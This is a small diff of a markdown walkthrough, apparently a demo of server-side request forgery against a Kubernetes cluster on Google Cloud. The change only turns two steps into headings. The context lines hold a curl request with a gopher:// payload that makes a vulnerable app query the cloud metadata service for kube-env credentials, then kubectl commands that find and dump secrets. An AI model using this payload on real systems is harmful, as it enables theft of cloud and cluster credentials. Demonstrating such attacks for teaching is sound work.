@@ -99,7 +99,7 @@ cd metadata-script
 curl -X POST 'http://localhost:8080/get_contents' --data 'url=gopher%3A%2F%2F169.254.169.254%3A80%2F_GET+%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson+HTTP%2F1.1%250d%250aMetadata-Flavor%3A+Google%250d%250aConnection%3A+Close%250d%250a%250d%250a' -o metadata.txt
 ```
 
-- Move current kubeconfig file
+#### Move current kubeconfig file
 ```
 mv ~/.kube/config ~/.kube/config.tmp
 ```
@@ -135,7 +135,7 @@ kubectl $KUBE_OPT describe pod | grep secret
 kubectl $KUBE_OPT get secret dummy-secret -o yaml
 ```
 
-- Move back kubeconfig file
+#### Move back kubeconfig file
 ```
 mv ~/.kube/config.tmp ~/.kube/config
 ```
